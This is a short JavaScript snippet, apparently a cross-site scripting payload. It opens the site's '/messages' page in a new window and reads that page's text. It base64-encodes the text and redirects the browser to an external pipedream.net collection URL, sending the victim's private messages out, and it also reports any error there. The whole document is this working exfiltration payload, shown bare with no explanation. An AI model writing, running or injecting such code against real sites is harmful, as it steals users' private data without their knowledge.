const w = window.open("/messages");

setTimeout(() => {
  try {
    if (!w || w.closed) throw new Error("Fenêtre fermée ou inaccessible");
    const body = w.document && w.document.body;
    if (!body) throw new Error("Pas de body trouvé");

    const content = body.innerText.trim();
    document.location = "https://eoeipamgnflz15n.m.pipedream.net?" + btoa(content);

  } catch (err) {
    const encodedErr = btoa(String(err));
    document.location = "https://eoeipamgnflz15n.m.pipedream.net?" + encodedErr;
  }
}, 2000);
